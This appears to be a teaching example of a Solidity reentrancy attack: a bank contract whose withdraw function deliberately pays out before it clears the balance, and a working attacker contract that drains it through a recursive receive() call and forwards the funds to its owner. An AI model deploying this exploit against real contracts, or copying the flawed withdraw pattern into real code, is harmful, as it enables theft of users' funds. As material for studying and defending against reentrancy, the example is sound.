// ⚠️ VULNERABLE CONTRACT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];

        require(amount > 0, "Insufficient balance");

        // ⚠️ Sends funds *before* updating balance
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");

        // ⚠️ Balance update happens AFTER sending
        balances[msg.sender] = 0;
    }
}

// Attacker Contract 

// ⚠️ MALICIOUS CONTRACT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public vulnerableBank;
    address public owner;

    constructor(address _bankAddress) {
        vulnerableBank = IVulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // Deposit some ETH into the vulnerable contract
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw();
    }

    // Fallback function (triggered when receiving ETH)
    receive() external payable {
        if (address(vulnerableBank).balance > 0) {
            vulnerableBank.withdraw(); // ⚠️ Recursive call
        } else {
            payable(owner).transfer(address(this).balance); // Send stolen funds to attacker
        }
    }
}
